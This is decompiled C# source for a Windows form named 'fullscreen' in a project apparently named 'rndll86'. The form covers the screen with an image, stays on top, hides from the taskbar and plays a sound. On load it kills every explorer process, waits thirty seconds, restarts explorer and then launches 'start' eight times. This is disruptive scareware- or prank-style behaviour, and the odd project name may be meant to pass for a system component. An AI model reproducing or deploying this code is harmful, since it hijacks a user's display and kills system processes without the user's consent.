using Microsoft.VisualBasic.CompilerServices;
using rndll86.My;
using rndll86.My.Resources;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace rndll86
{
	[DesignerGenerated]
	public class fullscreen : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return _PictureBox1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_PictureBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		public fullscreen()
		{
			base.Load += fullscreen_Load;
			__ENCAddToList(this);
			InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if ((disposing && components != null) ? true : false)
				{
					components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(rndll86.fullscreen));
			PictureBox1 = new System.Windows.Forms.PictureBox();
			((System.ComponentModel.ISupportInitialize)PictureBox1).BeginInit();
			SuspendLayout();
			PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
			PictureBox1.Image = (System.Drawing.Image)resources.GetObject("PictureBox1.Image");
			System.Drawing.Point point2 = PictureBox1.Location = new System.Drawing.Point(0, 0);
			PictureBox1.Name = "PictureBox1";
			System.Drawing.Size size2 = PictureBox1.Size = new System.Drawing.Size(436, 351);
			PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			PictureBox1.TabIndex = 0;
			PictureBox1.TabStop = false;
			System.Drawing.SizeF sizeF2 = AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			size2 = (ClientSize = new System.Drawing.Size(436, 351));
			Controls.Add(PictureBox1);
			FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			MaximizeBox = false;
			Name = "fullscreen";
			ShowIcon = false;
			ShowInTaskbar = false;
			Text = "fullscreen";
			TopMost = true;
			WindowState = System.Windows.Forms.FormWindowState.Maximized;
			((System.ComponentModel.ISupportInitialize)PictureBox1).EndInit();
			ResumeLayout(false);
		}

		private void fullscreen_Load(object sender, EventArgs e)
		{
			MyProject.Computer.Audio.Play(Resources._11.ToString());
			TopMost = true;
			try
			{
				Process[] processesByName = Process.GetProcessesByName("EXPLORER");
				foreach (Process process in processesByName)
				{
					process.Kill();
				}
				Process[] processesByName2 = Process.GetProcessesByName("Explorer");
				foreach (Process process2 in processesByName2)
				{
					process2.Kill();
				}
				Process[] processesByName3 = Process.GetProcessesByName("explorer");
				foreach (Process process3 in processesByName3)
				{
					process3.Kill();
				}
				Thread.Sleep(30000);
				Process.Start("explorer");
				Process.Start("start");
				Process.Start("start");
				Process.Start("start");
				Process.Start("start");
				Process.Start("start");
				Process.Start("start");
				Process.Start("start");
				Process.Start("start");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
